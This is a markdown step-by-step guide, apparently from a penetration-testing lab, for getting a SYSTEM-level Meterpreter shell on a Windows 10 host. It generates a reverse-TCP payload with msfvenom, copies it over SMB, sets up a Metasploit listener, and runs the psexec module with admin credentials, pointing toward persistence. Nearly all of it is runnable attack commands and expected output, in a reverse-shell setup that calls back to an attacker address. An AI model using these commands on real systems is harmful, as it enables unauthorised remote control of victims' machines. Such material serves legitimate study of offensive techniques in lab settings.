**simple, step-by-step guide** to get a **Meterpreter shell on a Windows 10 machine using PsExec**, which is what you need before setting up persistence. I've made it **easy to remember and repeat**, broken into two phases: **Listener Setup (Kali)** and **PsExec Exploit (Metasploit)**.

---

Pre-requisite

```
## 🔑 Gaining Administrative Rights on the Target Machine

> Before proceeding with the main steps, you may need to gain administrative rights on the target machine. Here's how you can create a malicious executable and transfer it to the target machine using `msfvenom` and `smbclient`.

### 🧱 Step 0: Create a Malicious Executable with msfvenom
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.117.100 LPORT=4444 -f exe -o malicious.exe
```
- Replace `LHOST` with your Kali machine's IP address.
- Replace `LPORT` with the port you want to use for the reverse shell.

### 🧱 Step 1: Transfer the Executable to the Target Machine
Use `smbclient` to copy the malicious executable to a writable share on the target machine:
```bash
smbclient //172.22.117.20/C$ -U tstark
put malicious.exe
```
- Replace `//172.22.117.20/C$` with the target machine's SMB share path.
- Replace `tstark` with the username that has access to the share.

### 🧱 Step 2: Execute the Malicious File on the Target Machine
Gain access to the target machine and execute the file:
1. Use `psexec`, RDP, or another method to log in.
2. Navigate to the location of `malicious.exe` and run it.

### 🧱 Step 3: Catch the Reverse Shell
Ensure your Metasploit listener is running (refer to **Phase 1: Listener Setup**) to catch the reverse shell.

> ✅ Once the reverse shell is established, you can escalate to SYSTEM-level rights using Meterpreter commands like `getsystem`.

---
> **Note:** This step assumes you have valid credentials to access the target machine. If not, you'll need to explore other techniques to gain initial access.

```

## 🧪 Phase 1: Set Up the Listener in Kali Linux

> Think of this as “setting the trap” to catch the shell.

### 🧱 Step 1: Open Metasploit
```bash
msfconsole
```

### 🧱 Step 2: Kill old background jobs (optional but safe)
```bash
jobs -K
```

### 🧱 Step 3: Set up a multi/handler to catch the reverse shell
```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.117.100     # Your Kali IP address
set LPORT 4444
run -j
```
> ✅ You now have a listener running in the background, ready to catch a reverse shell.

---

## 💣 Phase 2: Launch the Exploit with PsExec

> Think of this as “delivering the shell.”

### 🧱 Step 4: Use PsExec in Metasploit
```bash
use exploit/windows/smb/psexec
```

### 🧱 Step 5: Set the target IP
```bash
set RHOSTS 172.22.117.20     # Target Windows 10 IP
```

### 🧱 Step 6: Set SMB credentials (must be ADMIN)
```bash
set SMBUser tstark
set SMBPass Password!
set SMBDomain megacorpone
```

### 🧱 Step 7: Use the same payload from the handler
```bash
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.22.117.100
set LPORT 4444
```

### 🧱 Step 8: Launch the attack
```bash
run
```

---

## ✅ What to Expect

If successful, you'll see:
```
Sending stage (200262 bytes) to 172.22.117.20
Meterpreter session 1 opened
```

You now have a **SYSTEM-level Meterpreter session**, which is required for persistence techniques like:

- Creating services
- Scheduled tasks
- Registry changes

---

## 🔁 Quick Recap

| Step | Command |
|------|---------|
| 1 | `msfconsole` |
| 2 | `jobs -K` |
| 3 | `use exploit/multi/handler` |
| 4 | `set PAYLOAD windows/x64/meterpreter/reverse_tcp` |
| 5 | `set LHOST <Kali IP>` |
| 6 | `set LPORT 4444` |
| 7 | `run -j` |
| 8 | `use exploit/windows/smb/psexec` |
| 9 | `set RHOSTS <Target IP>` |
| 10 | `set SMBUser`, `SMBPass`, `SMBDomain` |
| 11 | `set PAYLOAD`, `LHOST`, `LPORT` again |
| 12 | `run` |

---
